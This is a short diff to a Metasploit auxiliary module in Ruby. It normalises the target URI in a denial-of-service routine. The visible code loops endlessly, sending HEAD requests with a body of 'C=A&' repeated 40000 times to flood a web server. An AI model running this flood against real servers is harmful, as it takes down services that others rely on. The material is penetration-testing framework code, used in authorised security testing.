@@ -47,7 +47,8 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	def run
-		print_status("Attacking http://#{datastore['VHOST'] || rhost}:#{rport}#{datastore['URI']}")
+		uri = normalize_uri(datastore['URI'])
+		print_status("Attacking http://#{datastore['VHOST'] || rhost}:#{rport}#{uri}")
 
 		begin
 			while(1)
@@ -55,7 +56,7 @@ class Metasploit3 < Msf::Auxiliary
 					connect
 					payload = "C=A&" * 40000
 					length = payload.size
-					sploit = "HEAD #{datastore['URI']} HTTP/1.1\r\n"
+					sploit = "HEAD #{uri} HTTP/1.1\r\n"
 					sploit << "Host: #{datastore['VHOST'] || rhost}\r\n"
 					sploit << "Connection:Close\r\n"
 					sploit << "Content-Type: application/x-www-form-urlencoded\r\n"
